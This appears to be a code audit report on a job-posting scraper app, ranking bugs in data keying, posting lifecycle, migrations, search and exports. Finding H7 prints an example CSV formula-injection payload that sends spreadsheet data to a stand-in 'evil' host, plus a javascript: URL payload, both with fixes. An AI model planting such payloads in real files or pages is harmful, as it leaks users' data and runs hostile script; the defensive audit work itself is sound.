@@ -1,0 +1,353 @@
+KNOWITALL - PROGRAM DESIGN & AUDIT  (version 0.0, "complete rework")
+Repository: github.com/lwa231/KnowItAll  commit bc98cf1
+Local copy: /Users/luqman_ahmed/Desktop/Web-Scraper  (checked file-by-file: identical to bc98cf1)
+Audited: 2026-09-28
+====================================================================================================
+
+HOW THIS AUDIT WAS DONE
+----------------------------------------------------------------------------------------------------
+  * Read every Python module, the UI JavaScript that touches data, the build spec and the README.
+  * Ran the test suite: 645 passed, 1 deselected (the opt-in Chrome integration test), 33 s.
+    Environment: Linux, Python 3.11, requirements-dev.txt. botasaurus downloads a native helper
+    library from GitHub when it is imported. That download is blocked here, so a stand-in library with
+    the same four entry points was used. It makes botasaurus' own HTTP client fail, so every request
+    goes through the plain-`requests` fallback. No test needs the real network, so the result stands.
+    The Chrome/Firefox version lists botasaurus also downloads were copied from your Mac's venv.
+  * Your Mac's .pytest_cache lists 8 failures (geo Singapore, facet filters, workday streaming, mark_new,
+    3 migrations). They come from an earlier run that day and all pass on the current code.
+  * Every finding marked [VERIFIED] was reproduced with a script against the real code. [PLAUSIBLE] means
+    it was reasoned from the code but not reproduced here (usually because it needs Windows).
+
+
+1. WHAT CHANGED SINCE THE FIRST AUDIT (commit 10d4936)
+----------------------------------------------------------------------------------------------------
+  Old finding                                   Status
+  H1 data written next to the code .............. FIXED  (platformdirs, KNOWITALL_HOME, legacy move)
+  H2 event-id reuse after trim .................. FIXED  (monotonic _next_id)
+  H3 UI and scraper share one Chrome ............ FIXED  (pywebview window + lazy headless BrowserPool)
+  H4 local API had no CSRF protection ........... FIXED  (per-launch token, Origin check, JSON-only POST)
+  H5 nothing structured to filter on ............ FIXED  (workplace, employment type, city/region/country,
+                                                          FTS5 search, facets, region groups)
+  M1 global mutable settings .................... FIXED  (RunConfig / ScanContext / CancelToken)
+  M2 CLI and UI on separate code paths .......... FIXED  (both go through Service -> Runner)
+  M3 fake streaming ............................. FIXED  (readers emit page by page)
+  M4 front end held every row ................... FIXED  (server-side paging and filtering)
+  M5 400 ms polling ............................. FIXED  (server-sent events with fallback polling)
+  M6 1,358-line index.html + Tailwind CDN ....... FIXED  (ES modules, vendored fonts, no CDN)
+  M7 per-run job copies ......................... FIXED  (postings + run_postings, first/last seen)
+  M8 caches never shrink ........................ MOSTLY (startup prune, byte-bounded soup cache)
+  L3 duplicated needs_browser ................... FIXED
+  L4 unlocked runner state ...................... FIXED
+  L5 no tests ................................... FIXED  (284 test functions, 645 cases)
+  L6 logs only on console ....................... FIXED  (rotating file log)
+  L7 helper binary downloaded at runtime ........ NOT FIXED, and worse than first described (see H1)
+
+  This is a large, disciplined improvement. Most of what follows is edge cases in newer, more
+  ambitious features, plus one old risk (L7) that turns out to be the biggest remaining problem.
+
+
+2. RUNTIME LAYOUT (current)
+----------------------------------------------------------------------------------------------------
+
+   ui.py / KnowItAll.exe                              main.py (CLI)
+     paths.enter_data_dir()  (mkdir, log, migrate      paths.enter_data_dir()
+        legacy data, chdir DATA_DIR)                   Service() + optional BrowserPool
+     SingleInstance lock (window only)                 service.start(...) ; service.wait()
+     Service() -> Runner()                             print_summary
+     server.serve(service)  127.0.0.1:<random>
+     BrowserPool (lazy headless Chrome, 1-3)
+     pywebview window -> http://127.0.0.1:<port>/  (token + theme injected into index.html)
+
+   Data:    DATA_DIR  = %LOCALAPPDATA%\KnowItAll | ~/Library/Application Support/KnowItAll
+              history.db (+ .v2.bak), cache/, logs/knowitall.log, settings.json, window.json, app.lock
+            EXPORTS   = ~/Documents/KnowItAll/exports/jobs_<domain>.json|.csv, jobs_all_companies.csv
+
+
+3. MODULE MAP (current)
+----------------------------------------------------------------------------------------------------
+   ENTRY        ui.py, main.py, knowitall.spec
+   SHELL        paths.py (locations, migration)  shell.py (lock, window geometry)  logsetup.py
+   API          server.py (stdlib HTTP, SSE /api/stream, token/Origin checks)
+                service.py (the one application API; both front ends call it)
+   ORCHESTRATE  runner.py (queue, per-company cancel, events)  context.py (RunConfig/ScanContext/CancelToken)
+                settings.py (validated settings.json)
+   PIPELINE     scraper.py -> discovery.py -> ats_detect.py -> ats/{greenhouse,lever,ashby,workday,
+                smartrecruiters}.py -> generic.py (links + JSON-LD) -> BrowserPool fallback
+   SCHEMA       normalize.py (workplace, employment type, dates, url_key, dedupe)
+                geo.py + data/*.json (curated places; ambiguous text stays empty)
+   STORAGE      store.py (migrations v1->v3, postings lifecycle, FTS5, query_jobs, prune, compact)
+                search.py (query syntax -> FTS5 / LIKE)  export.py  maintenance.py
+   IO           fetch.py (botasaurus client -> requests fallback, 60 s deadline, 12 h cache, soup cache)
+                browser.py (BrowserPool)  compat.py (everything relied on in botasaurus internals)
+   UI           ui/index.html + js/ (api, state, filters, filterbar, jobs, table, workspace, queue, run,
+                notices, views/*) + css/ + fonts/
+
+
+4. DATA MODEL AND LIFECYCLE (current)
+----------------------------------------------------------------------------------------------------
+   runs          id, domain, company, source, status(running|done|stopped|failed), started/finished,
+                 jobs_count, new_count
+   postings      one row per url_key (GLOBAL, not per company): latest fields, first_seen, last_seen,
+                 missing_since, closed_at, last_run_id, domain
+   run_postings  (run_id, posting_id, is_new)
+   postings_fts  FTS5 over title, company, location, department, city, region, country
+
+   "current" view = the rows of MAX(runs.id) per domain among status running|done|stopped
+   Lifecycle     complete scan misses a posting -> missing_since ; next complete miss -> closed_at ;
+                 seen again -> both cleared.  "complete" = done, not truncated, >0 jobs, same ATS as
+                 the previous done run.
+
+
+5. TEST RESULTS
+----------------------------------------------------------------------------------------------------
+   645 passed / 0 failed / 1 deselected.  The suite is strong on units (parsers, migrations, security
+   headers, pool behaviour). None of the VERIFIED bugs below are covered by a test. Each should get a
+   regression test when it is fixed.
+
+
+6. FINDINGS, RANKED
+----------------------------------------------------------------------------------------------------
+
+  HIGH  -  wrong data, crashes, or security
+
+  H1. First launch needs GitHub and Mozilla, and loads an unverified native binary.  [VERIFIED]
+      Importing botasaurus_requests (fetch.py imports it at module load) does three things:
+        a) calls api.github.com/repos/daijro/hrequests/releases (unauthenticated: 60 requests/hour per
+           IP) and downloads the newest "hrequests-cgo-2.*" library for the OS,
+        b) scrapes Chrome and Firefox version lists from the web,
+        c) loads that library with ctypes. There is no checksum or pinned version, "newest 2.*" changes
+           over time, and it starts a local Go HTTP server on another loopback port.
+      Offline, behind a proxy, on a school/office network, or rate-limited: `import knowitall.fetch`
+      raises. The window and the CLI cannot start at all. (Reproduced: every module that imports fetch
+      fails to import without network.)
+      It also writes into the package folder. In a PyInstaller build that is _internal/, which is
+      read-only under Program Files. check_library() deletes other versions it finds there.
+      Fix: fetch the binary and the version lists at BUILD time, pin the exact filename, verify a SHA-256,
+      and bundle them via the spec. At runtime, never download. If the library is missing, fall back to
+      plain requests with a notice instead of crashing.
+
+  H2. url_key() throws away the query string, so different postings collapse into one.  [VERIFIED]
+      Only gh_jid survives. Reproduced:
+        acme.com/careers/job?jobid=101 and ?jobid=102       -> same key
+        acme.taleo.net/.../jobdetail.ftl?job=555 and ?job=556 -> same key
+        listing with 10 links /careers/job?jobid=N          -> generic.job_links() returns 1
+      generic.JOB_QUERY_RE matches exactly these links (jobid, job_id, reqid, requisitionid), so the
+      fallback finds them and then dedupes them away. Taleo, iCIMS, SuccessFactors and many self-hosted
+      boards use query ids. url_key is also the GLOBAL posting identity, so the "new" flag, the history and
+      closing are wrong for those sites too.
+      Fix: keep an allowlist of id-bearing parameters (job, jobid, job_id, jid, id, reqid, requisitionid,
+      gh_jid, career_job_req_id, ...), or keep all parameters except known tracking ones (utm_*, src,
+      source, ref, gclid, fbclid, lang...). Changing the key needs a store migration that re-keys postings.
+
+  H3. Inline JSON-LD postings without a "url" collapse to one.  [VERIFIED]
+      job_from_ld() falls back to the listing page URL, so 5 embedded JobPostings on one page become 5
+      rows with the same URL, and dedupe keeps 1. Fix: when the posting has no url, use
+      page_url + "#" + (identifier.value | title slug), and do not treat the fragment as noise for that case.
+
+  H4. Postings are declared "closed" on too little evidence.  [VERIFIED]
+      a) Workday: a result page that fails (5xx, timeout) is skipped silently and the scan is NOT marked
+         truncated. Reproduced: 40 of 60 jobs returned, truncated=None. finish_run(complete=True) then
+         marks the 20 unread jobs "missing".
+      b) No time gap is required between the two observations. Reproduced: three scans a few seconds
+         apart -> 2 postings "closed". Pressing Start twice in a minute can close real jobs.
+      c) Both observations can come from the 12-hour page cache, so they are not independent.
+      d) Parallel pagination over a live Workday/SmartRecruiters listing can skip items if the listing
+         shifts between pages.
+      Fix: any reader that skips a failed page must call ctx.mark_truncated(). Close only after two misses
+      at least ~24 h apart with fresh (non-cached) data. Store per-run "complete" and fetch mode on runs.
+      Optionally, before closing, check the posting's own URL (404/410 = closed).
+
+  H5. The "current" view shows partial or dead scans.  [VERIFIED]
+      a) A Stopped scan counts as current. Reproduced: a full scan of 500 postings, then a rescan stopped
+         after 3 -> the company shows 3 postings until the next complete scan.
+      b) If the app is killed mid-scan, the run stays status='running' forever. It stays "current" with
+         its partial rows, and prune() excludes 'running' rows, so it is never cleaned up. Reproduced
+         across a restart.
+      Fix: at startup, mark stale 'running' runs as 'failed' (or 'interrupted'). For the current view,
+      use the newest run that is done, or running; fall back to the previous done run when the newest is
+      stopped, failed or interrupted, and label the pane "showing last complete scan".
+
+  H6. Two processes at first launch after an upgrade: the second one crashes.  [VERIFIED]
+      store.init() reads schema_version before taking the write lock. _write_lock is per process, so the
+      CLI and the window (or two windows at once, since init runs before the single-instance lock) both
+      run the migration. Reproduced on a 40,000-row v1 database: the second process fails with
+      "OperationalError: database is locked". Without the lock timeout it would hit
+      "table postings already exists" instead.
+      Fix: take BEGIN IMMEDIATE first, re-read schema_version inside the transaction, then migrate. Also
+      take the single-instance lock BEFORE paths.enter_data_dir() does its legacy data move.
+
+  H7. Scraped text is trusted too far.  [VERIFIED]
+      a) CSV formula injection: a title such as  =HYPERLINK("http://evil/?x="&A1,"Apply")  is written
+         unchanged into jobs_<domain>.csv, and Excel evaluates it on open (reproduced: the cell begins
+         with =). Fix: prefix any cell starting with = + - @ TAB or CR with a single quote in write_csv.
+      b) A JSON-LD url of  javascript:fetch('/api/quit')  is kept (reproduced) and rendered as the job's
+         href. esc() prevents HTML injection but not a javascript: scheme. Clicking it runs script in
+         the app's own origin, which knows the API token. Fix: make_job() accepts only http/https URLs,
+         and rowHTML() checks the scheme again.
+
+  H8. Windows can serve the UI's JavaScript with the wrong MIME type -> blank window.  [PLAUSIBLE]
+      server._file() uses mimetypes.guess_type(), which on Windows reads the registry. Machines where
+      .js is registered as text/plain are common (a known Python issue that affects Django, Flask and
+      others). The page loads main.js as <script type="module">, and responses carry
+      X-Content-Type-Options: nosniff. Chromium/WebView2 refuses module scripts that are not served as
+      JavaScript, so the window stays blank. boot().catch never runs because the module never loads.
+      Fix: an explicit table for .js .css .woff2 .html .json .svg in server.py (and a test).
+
+
+  MEDIUM  -  wrong or surprising results
+
+  M1. Search semantics break on common tech terms and ordinary English.  [VERIFIED on a real DB]
+        "c++"                -> also "C Programmer"       (++ is dropped by the tokenizer, leaving "c")
+        ".net"               -> also "Network Engineer"   (becomes prefix net*)
+        "go"                 -> also "Google Ads ..."     (prefix go*)
+        "engineer in london" -> nothing                   ("in" must match in* or country IN)
+        "engineer at google" -> nothing                   ("at" must match at* or country AT)
+      Fix: a small stop-word list (in, at, for, the, of, and, with...), and a "tech tokens" map
+      (c++ -> "cplusplus", c# -> "csharp", .net -> "dotnet", go -> exact word "go" / "golang").
+      Apply the same normalisation when indexing (an extra FTS column), not only when querying.
+      No prefix matching for terms under 3 letters. The LIKE fallback does substring matching, so its
+      results differ from FTS5 for the same query; make both use the same word rules.
+
+  M2. Workplace and employment type are inferred from the wrong words.  [VERIFIED]
+        title "Remote Sensing Scientist" / "Remote Patient Monitoring" -> workplace=remote
+        title "Hybrid Cloud Engineer"                                  -> workplace=hybrid
+        workplace_of("Not remote" / "Non-remote" / "On-site (remote not available)") -> remote
+        workplace_of("Remote, flexible hours")                         -> hybrid
+        employment_type_of("Internal" / "International Assignment")    -> intern
+        make_job(remote=False)                                          -> workplace=onsite
+          (README says on-site is never guessed. remote=False historically meant on-site OR hybrid)
+      Fix: never infer workplace from the title except in bracketed/suffix forms ("(Remote)", "- Remote").
+      Handle negation (not/non/no remote). Use \bintern(ship)?\b. Map legacy remote=False to None.
+
+  M3. Board guessing accepts the wrong company.  [VERIFIED]
+      names_match() is a substring test. slug "meta" accepts a board titled "Metaview", "box" accepts
+      "Boxed", "ramp" accepts "Rampart Security", "arc" accepts "Arcadia". If the guessed board's token
+      exists and its jobs aren't on the company's domain, the wrong company's jobs are imported as this
+      company's, and the "by name" note is easy to miss. The same function drives
+      _use_proper_company_name.
+      Fix: compare whole words after removing suffixes (inc, llc, ltd, jobs, careers, technologies,
+      labs...). Require exact equality for slugs under 5 characters. When a guess is accepted on the
+      name alone, show it prominently.
+
+  M4. Dates are treated as more precise than they are.
+      a) Greenhouse: posted = first_published OR updated_at. updated_at is an edit time, so edited
+         old jobs pass "posted in the last 7 days".
+      b) Workday "Posted 30+ Days Ago" becomes exactly 30 days ago. These jobs can be months old but
+         pass a 60-day filter.
+      c) Workday relative dates are resolved when parsed, but the JSON can come from a cache up to 12 h
+         old, so "Posted Today" can be off by a day.
+      d) Anything that is not ISO or epoch ("Jan 5, 2024", "05/01/2024") becomes None. The Posted
+         filter then silently drops every row with an unknown date, which includes most html-heuristic
+         rows. Nothing falls back to first_seen.
+      e) fromisoformat accepts more formats on Python 3.11+ than on 3.9/3.10, so the same data parses
+         differently depending on the Python version.
+      Fix: store posted_precision (exact/day/lower_bound/unknown). Let the filter use
+      COALESCE(posted, first_seen) with a visible "date estimated" marker. Resolve relative dates
+      against the fetch time, not the parse time.
+
+  M5. One failed Chrome start disables the browser for the whole session.
+      BrowserPool._mark_unavailable() is permanent: a one-off launch failure (Chrome updating, slow
+      first start, antivirus) means every JavaScript site is skipped until restart, and there is no
+      "retry" button. A render can take ~90 s (get timeout 45 s + ready wait 45 s) and ignores Stop.
+      Fix: retry with backoff (for example 3 attempts over 10 minutes), add a Retry action in the
+      System view, and check the cancel token inside _load().
+
+  M6. "Load more" uses offset paging over data that is still changing.
+      During a scan, rows are inserted in "posted desc" order, so offset N points at different rows
+      between requests: duplicates and skipped rows. With more than 500 rows loaded, a live refresh
+      only updates the count and the visible rows go stale.
+      Fix: keyset pagination (posted, id) with an "after" cursor, and a "N new postings - show" banner
+      instead of replacing rows under the user.
+
+  M7. Posting identity is global, but ownership isn't.
+      postings.url_key is UNIQUE across all companies, and save_jobs() overwrites postings.domain with
+      whichever company scanned it last. Two inputs that reach the same board (for example a
+      parent/subsidiary domain, or a rebrand) make the posting move between companies, and _close_missing
+      for the other company never sees it. mark_new() is a read and save_jobs() a later separate write,
+      so two workers scanning overlapping boards both count the same posting as new.
+      Fix: key postings by (domain, url_key) or add a posting_domains link table. Do mark_new and
+      save_jobs in one write transaction.
+
+  M8. Exports.
+      a) ~/Documents is hard-coded. On Windows with OneDrive "Known Folder Move", the user's Documents is
+         OneDrive\Documents, so exports land in a folder they never look at.
+         Use platformdirs.user_documents_dir().
+      b) Files are overwritten in place, not atomically. If the CSV is open in Excel (Windows locks it),
+         the JSON is rewritten, the CSV write fails, and the only sign is a log line, so the two files
+         disagree.
+      Fix: write to temp and os.replace. On PermissionError, write jobs_<domain> (1).csv and show a UI
+      notice.
+
+  M9. Server and runner edge cases.
+      a) No catch-all error handler: any exception in a route drops the connection with no response. For
+         example, /api/run with options {"max_jobs": "abc"} raises inside Runner.start and the client
+         gets a network error.
+      b) Run options are not validated server-side: settings.validate() exists but runner.start() uses
+         int(...) directly, so negative or huge values are accepted from any client.
+      c) /api/stop for an unknown or finished domain returns {"stopped": true}.
+      d) Adding to the queue during a run leaves the company "queued" until the next Start, with no hint.
+      e) Runner._drive's finally reads self.pool, and sets _idle and emits status(running=False), after
+         releasing the lock. A Start in that window can have its _idle state and status event overwritten
+         by the previous run.  [PLAUSIBLE: could not force it; the new pool submits before the old
+         shutdown reaches it]
+         Fix: capture pool and idle event locally in start() and pass them to _drive.
+
+  M10. CLI and window running at the same time.
+      a) The CLI ignores saved settings for max_jobs, concurrency, fresh and autosave (argparse defaults
+         always win), but the README says settings are shared with the command line.
+      b) Both processes use RotatingFileHandler on the same knowitall.log. On Windows, rollover fails
+         with PermissionError ("used by another process"). On macOS, one process keeps writing to the
+         renamed file.
+      c) Both run startup prune, and compact() is refused only when THIS process is scanning.
+      Fix: take the instance lock in the CLI too (or a DB-level "scan in progress" row). Load settings as
+      argparse defaults. Use one log file per process, or a QueueHandler.
+
+
+  LOW  -  hygiene, polish, docs
+
+  L1. README drift: still says Tailwind and fonts load from a CDN (both removed); says Settings
+      "persist in the browser" (they're in settings.json); still describes the old single filter box;
+      lists normalize.py twice; the project layout omits service, context, settings, compat, export,
+      maintenance; the CLI table omits --browser-workers, --no-history, --no-export.
+  L2. Reproducibility: only botasaurus is pinned. pywebview, platformdirs, beautifulsoup4 and lxml
+      float. The spec's hiddenimports list is stale (harmless but misleading).
+      collect_all("webview") bundles every GUI backend.
+  L3. Second launch: prints "already running" and exits with code 2. From a double-clicked exe the
+      console flashes and closes. Bring the existing window to the front instead (send a message
+      through the lock file or a local port).
+  L4. Window geometry: pywebview screen rectangles (DIP) vs window positions (physical pixels) can
+      disagree on Windows at 125-150 % scaling. The maximized state isn't remembered. window.json is
+      written non-atomically.
+  L5. Per-request cost: every HTTP request thread opens a new SQLite connection (pragma + UDF each
+      time); the System view walks the whole cache folder on the request thread every poll; each search
+      keystroke runs 8 queries (count, page, 6 facets).
+  L6. The queue list is rebuilt with innerHTML on every SSE message, so a keyboard user loses focus on
+      the per-company Stop button while a scan is running.
+  L7. save_jobs() does a SELECT and UPDATE per job while holding the global write lock, so a 2,000-row
+      Workday board blocks other companies' writes.
+  L8. First scan of any company marks everything "new", so the New-only filter means nothing then.
+      A posting pruned after 180 days closed counts as "new" again if it reappears.
+  L9. No CI configuration. "Python 3.9+" is claimed but not tested anywhere. The suite was run here on
+      3.11, and on your Mac with 3.12.
+  L10. clear_cache() can run mid-scan and delete cache files a worker is about to read.
+
+
+7. WHAT TO KEEP DOING
+----------------------------------------------------------------------------------------------------
+  + The "a wrong answer is worse than none" rule in geo.py is applied consistently, and it shows: every
+    ambiguous location I tried (Paris, Cambridge, Washington, London ON) was handled correctly.
+  + Migrations are versioned, transactional and back up before rewriting.
+  + compat.py lists exactly what is borrowed from botasaurus internals. Keep it current.
+  + Security basics on the local API are now solid (token, Origin, JSON-only POST, nosniff,
+    X-Frame-Options, Host check, body cap).
+  + Tests use recorded fixtures instead of the network, which is why the suite runs in 33 s.
+
+
+8. SUGGESTED ORDER OF WORK
+----------------------------------------------------------------------------------------------------
+  1. H1 (bundle and pin the helper library)  - without it, some users can't start the app at all.
+  2. H6, H5b (startup/migration robustness).
+  3. H2, H3, H4 (data correctness; H2 needs a re-keying migration, so do it before users have much data).
+  4. H7, H8 (security + blank-window risk; both small changes).
+  5. M1-M4 (search and inference quality), then the rest.
+  Add one regression test per item above as it is fixed.
